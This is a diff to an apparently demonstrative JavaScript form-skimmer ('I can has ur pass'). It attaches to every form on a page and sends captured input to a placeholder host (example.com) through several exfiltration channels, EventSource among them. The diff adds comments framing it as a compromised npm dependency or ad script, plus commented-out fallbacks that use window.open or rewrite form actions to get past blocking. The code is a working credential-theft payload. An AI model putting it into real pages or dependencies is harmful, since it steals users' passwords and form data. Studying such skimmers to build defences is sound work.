@@ -1,3 +1,9 @@
+// I can has ur pass
+
+// Imagine you build an app and this bit, although a little more obfuscated,
+//  gets mixed up in one of your npm dependencies.
+//  Or an analytics/ads provider decides to serve this / gets hacked.
+
 Array.from(document.querySelectorAll('form'))
     .map(form => {
         console.log('evil script attached', form)
@@ -30,4 +36,13 @@ const senders = [
         document.head.appendChild(l)
     },
     payload => new EventSource(`https://example.com/?q=${payload}`),
+    // If you blocked everything, including form action, try this one to lighten up your mood
+    // payload => window.open(`https://example.com/?q=${payload}`)
 ]
+
+// Uncomment this when you fix senders
+// in case all senders don't work
+// Array.from(document.querySelectorAll('form'))
+//     .map(form => {
+//         form.action = `https://example.com/`
+//     })
